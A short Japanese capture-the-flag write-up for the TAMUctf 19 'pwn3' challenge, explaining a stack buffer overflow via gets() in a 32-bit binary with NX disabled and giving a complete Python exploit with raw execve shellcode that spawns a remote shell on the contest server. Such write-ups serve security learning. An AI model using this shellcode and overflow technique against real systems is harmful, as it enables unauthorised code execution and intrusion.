# [pwn 387pts] pwn3 - TAMUctf 19
32ビットでPIE有効、Full RELROですが、DEPが無効です。
```
$ checksec pwn3
[*] 'pwn3'
    Arch:       32 bits (little endian)
    NX:         NX disabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Full RELRO
    PIE:        PIE enabled
```
だいたいNX disabledの時はシェルコードを動かす問題だと思います。

IDAで解析すると、echo関数でgetsを使って入力するのでバッファオーバーフローが存在します。
また、入力先のローカルバッファのアドレスを最初に出力してくれます。

したがって、リターンアドレスをバッファの先頭に書き換え、バッファの先頭にシェルコードを入れておけば任意の処理が実行できます。


```python
from ptrlib import *

sock = Socket("pwn.tamuctf.com", 4323)
#sock = Socket("localhost", 4323)
_ = input()
sock.recvuntil("journey")
addr = sock.recvuntil("!").rstrip(b"!")
addr_shellcode = int(addr, 16)
dump("&shellcode = " + hex(addr_shellcode))

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"

payload = shellcode
payload += b"\x90" * (0x12e - len(shellcode))
payload += p32(addr_shellcode)
sock.sendline(payload)

sock.interactive()
```

# 感想
シンプルなバッファオーバーフロー + シェルコードの問題です。
